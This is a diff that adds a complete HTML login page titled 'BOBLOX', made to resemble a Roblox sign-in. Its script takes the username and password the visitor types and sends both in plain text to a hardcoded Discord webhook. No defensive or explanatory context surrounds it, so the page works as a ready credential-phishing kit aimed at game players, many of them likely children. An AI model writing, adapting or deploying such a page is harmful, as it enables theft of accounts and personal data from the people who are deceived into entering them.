@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>BOBLOX</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #e5e5e5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .box {
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            width: 300px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.2);
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>BOBLOX</h2>
+    <input type="text" id="username1" placeholder="Username">
+    <input type="text" id="password" placeholder="password">
+    <button onclick="send()">Submit</button>
+</div>
+
+<script>
+function send() {
+    const u1 = document.getElementById("username1").value;
+    const u2 = document.getElementById("password").value;
+
+    if (!u1 || !u2) {
+        alert("Please fill right answers.");
+        return;
+    }
+
+    fetch("https://discordapp.com/api/webhooks/1454539825255547025/lkdswdlAiCdQeYUYZCukB6Kpc7lgasuWnsp8MCWmbkPe5r7-RP_NDyCPLZIKTxMvWFLm", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            content: `🎮 BOBLOX SUBMISSION\n👤 Username : ${u1}\n👤 password : ${u2}`
+        })
+    });
+
+    alert("Sent!");
+}
+</script>
+
+</body>
+</html>
